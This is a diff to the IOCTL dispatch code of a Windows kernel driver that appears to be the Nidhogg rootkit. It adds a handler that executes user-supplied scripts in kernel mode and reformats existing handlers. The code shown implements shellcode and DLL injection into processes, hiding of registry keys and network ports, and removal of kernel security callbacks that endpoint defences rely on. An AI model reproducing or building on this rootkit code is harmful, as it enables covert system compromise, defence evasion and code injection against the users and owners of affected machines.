@@ -43,6 +43,8 @@
 #define IOCTL_HIDE_UNHIDE_PORT CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_CLEAR_HIDDEN_PORTS CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_QUERY_HIDDEN_PORTS CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_EXEC_SCRIPT CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -118,7 +120,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", protectedProcess.Pid);
 		}
-		
+
 		len += sizeof(ProtectedProcess);
 		break;
 	}
@@ -574,7 +576,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		if (!NT_SUCCESS(status))
 			break;
-		
+
 		if (itemsCount == MAX_REG_ITEMS) {
 			Print(DRIVER_PREFIX "List is full.\n");
 			status = STATUS_TOO_MANY_CONTEXT_IDS;
@@ -687,21 +689,21 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
 
 		switch (data->Type) {
-			case RegProtectedKey:
-				itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
-				break;
-			case RegHiddenKey:
-				itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
-				break;
-			case RegProtectedValue:
-				itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
-				break;
-			case RegHiddenValue:
-				itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
-				break;
-			default:
-				status = STATUS_INVALID_PARAMETER;
-				break;
+		case RegProtectedKey:
+			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
+			break;
+		case RegHiddenKey:
+			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
+			break;
+		case RegProtectedValue:
+			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
+			break;
+		case RegHiddenValue:
+			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
+			break;
+		default:
+			status = STATUS_INVALID_PARAMETER;
+			break;
 		}
 
 		if (!NT_SUCCESS(status) || itemsCount == 0 || data->RegItemsIndex > itemsCount) {
@@ -874,7 +876,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
-	case IOCTL_INJECT_SHELLCODE: 
+	case IOCTL_INJECT_SHELLCODE:
 	{
 		ShellcodeInformation shellcodeInfo{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
@@ -932,29 +934,29 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		switch (shellcodeInfo.Type) {
-			case APCInjection: {
-				if (!Features.ApcInjection) {
-					Print(DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n");
-					status = STATUS_UNSUCCESSFUL;
-					break;
-				}
-
-				status = NidhoggMemoryUtils->InjectShellcodeAPC(&shellcodeInfo);
+		case APCInjection: {
+			if (!Features.ApcInjection) {
+				Print(DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n");
+				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-			case NtCreateThreadExInjection: {
-				if (!Features.CreateThreadInjection) {
-					Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx shellcode injection feature is unavaliable.\n");
-					status = STATUS_UNSUCCESSFUL;
-					break;
-				}
 
-				status = NidhoggMemoryUtils->InjectShellcodeThread(&shellcodeInfo);
+			status = NidhoggMemoryUtils->InjectShellcodeAPC(&shellcodeInfo);
+			break;
+		}
+		case NtCreateThreadExInjection: {
+			if (!Features.CreateThreadInjection) {
+				Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx shellcode injection feature is unavaliable.\n");
+				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-			default:
-				status = STATUS_INVALID_PARAMETER;
-				break;
+
+			status = NidhoggMemoryUtils->InjectShellcodeThread(&shellcodeInfo);
+			break;
+		}
+		default:
+			status = STATUS_INVALID_PARAMETER;
+			break;
 		}
 
 		if (NT_SUCCESS(status))
@@ -986,7 +988,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 		errno_t err = strcpy_s(dllInfo.DllPath, data->DllPath);
-		
+
 		if (err != 0) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
@@ -998,31 +1000,31 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		switch (dllInfo.Type) {
-			case APCInjection: {
-				if (!Features.ApcInjection) {
-					Print(DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n");
-					status = STATUS_UNSUCCESSFUL;
-					break;
-				}
-
-				status = NidhoggMemoryUtils->InjectDllAPC(&dllInfo);
+		case APCInjection: {
+			if (!Features.ApcInjection) {
+				Print(DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n");
+				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-			case NtCreateThreadExInjection: {
-				if (!Features.CreateThreadInjection) {
-					Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx dll injection feature is unavaliable.\n");
-					status = STATUS_UNSUCCESSFUL;
-					break;
-				}
 
-				status = NidhoggMemoryUtils->InjectDllThread(&dllInfo);
-				break;
-			}
-			default:
-				status = STATUS_INVALID_PARAMETER;
-				break;
+			status = NidhoggMemoryUtils->InjectDllAPC(&dllInfo);
+			break;
 		}
-		
+		case NtCreateThreadExInjection: {
+			if (!Features.CreateThreadInjection) {
+				Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx dll injection feature is unavaliable.\n");
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+
+			status = NidhoggMemoryUtils->InjectDllThread(&dllInfo);
+			break;
+		}
+		default:
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		if (NT_SUCCESS(status))
 			Print(DRIVER_PREFIX "DLL injected successfully.\n");
 		else
@@ -1032,7 +1034,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
-	case IOCTL_LIST_OBCALLBACKS: 
+	case IOCTL_LIST_OBCALLBACKS:
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
@@ -1049,13 +1051,13 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		switch (data->Type) {
-			case ObProcessType:
-			case ObThreadType: {
-				status = NidhoggAntiAnalysis->ListObCallbacks(data);
-				break;
-			}
-			default:
-				status = STATUS_INVALID_PARAMETER;
+		case ObProcessType:
+		case ObThreadType: {
+			status = NidhoggAntiAnalysis->ListObCallbacks(data);
+			break;
+		}
+		default:
+			status = STATUS_INVALID_PARAMETER;
 		}
 
 		len += sizeof(ObCallbacksList);
@@ -1074,16 +1076,16 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		auto data = (PsRoutinesList*)Irp->AssociatedIrp.SystemBuffer;
 
 		switch (data->Type) {
-			case PsImageLoadType:
-			case PsCreateProcessTypeEx:
-			case PsCreateProcessType: 
-			case PsCreateThreadType:
-			case PsCreateThreadTypeNonSystemThread: {
-				status = NidhoggAntiAnalysis->ListPsNotifyRoutines(data, NULL, NULL);
-				break;
-			}
-			default:
-				status = STATUS_INVALID_PARAMETER;
+		case PsImageLoadType:
+		case PsCreateProcessTypeEx:
+		case PsCreateProcessType:
+		case PsCreateThreadType:
+		case PsCreateThreadTypeNonSystemThread: {
+			status = NidhoggAntiAnalysis->ListPsNotifyRoutines(data, NULL, NULL);
+			break;
+		}
+		default:
+			status = STATUS_INVALID_PARAMETER;
 		}
 
 		len += sizeof(PsRoutinesList);
@@ -1123,19 +1125,19 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		if (data->Remove) {
 			switch (data->Type) {
-				case PsImageLoadType:
-				case PsCreateProcessType:
-				case PsCreateProcessTypeEx:
-				case PsCreateThreadType:
-				case PsCreateThreadTypeNonSystemThread:
-				case ObProcessType:
-				case ObThreadType:
-				case CmRegistryType: {
-					status = NidhoggAntiAnalysis->RemoveCallback(data);
-					break;
-				}
-				default:
-					status = STATUS_INVALID_PARAMETER;
+			case PsImageLoadType:
+			case PsCreateProcessType:
+			case PsCreateProcessTypeEx:
+			case PsCreateThreadType:
+			case PsCreateThreadTypeNonSystemThread:
+			case ObProcessType:
+			case ObThreadType:
+			case CmRegistryType: {
+				status = NidhoggAntiAnalysis->RemoveCallback(data);
+				break;
+			}
+			default:
+				status = STATUS_INVALID_PARAMETER;
 			}
 
 			if (NT_SUCCESS(status))
@@ -1145,19 +1147,19 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 		else {
 			switch (data->Type) {
-				case PsImageLoadType:
-				case PsCreateProcessType:
-				case PsCreateProcessTypeEx:
-				case PsCreateThreadType:
-				case PsCreateThreadTypeNonSystemThread:
-				case ObProcessType:
-				case ObThreadType:
-				case CmRegistryType: {
-					status = NidhoggAntiAnalysis->RestoreCallback(data);
-					break;
-				}
-				default:
-					status = STATUS_INVALID_PARAMETER;
+			case PsImageLoadType:
+			case PsCreateProcessType:
+			case PsCreateProcessTypeEx:
+			case PsCreateThreadType:
+			case PsCreateThreadTypeNonSystemThread:
+			case ObProcessType:
+			case ObThreadType:
+			case CmRegistryType: {
+				status = NidhoggAntiAnalysis->RestoreCallback(data);
+				break;
+			}
+			default:
+				status = STATUS_INVALID_PARAMETER;
 			}
 
 			if (NT_SUCCESS(status))
@@ -1330,7 +1332,52 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		NidhoggNetworkUtils->ClearHiddenPortsList();
 		break;
 	}
+	case IOCTL_EXEC_SCRIPT:
+	{
+		ScriptManager* scriptManager = nullptr;
+		ScriptInformation scriptInfo{};
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
+		if (!VALID_SIZE(size, sizeof(ScriptInformation))) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (ScriptInformation*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (data->ScriptSize == 0 || !data->Script) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		scriptInfo.ScriptSize = data->ScriptSize;
+		MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
+		status = scriptAllocator.CopyData(data->Script, scriptInfo.ScriptSize);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		__try {
+			scriptManager = new ScriptManager();
+			status = scriptManager->ExecuteScript((PUCHAR)scriptInfo.Script, scriptInfo.ScriptSize);
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {
+			status = GetExceptionCode();
+		}
+
+		if (scriptManager) {
+			delete scriptManager;
+			scriptManager = nullptr;
+		}
+
+		if (!NT_SUCCESS(status))
+			Print(DRIVER_PREFIX "Failed to execute script (0x%08X)\n", status);
+		else
+			Print(DRIVER_PREFIX "Executed script successfully.\n");
+
+		len += size;
+		break;
+	}
 	default:
 		status = STATUS_INVALID_DEVICE_REQUEST;
 		break;
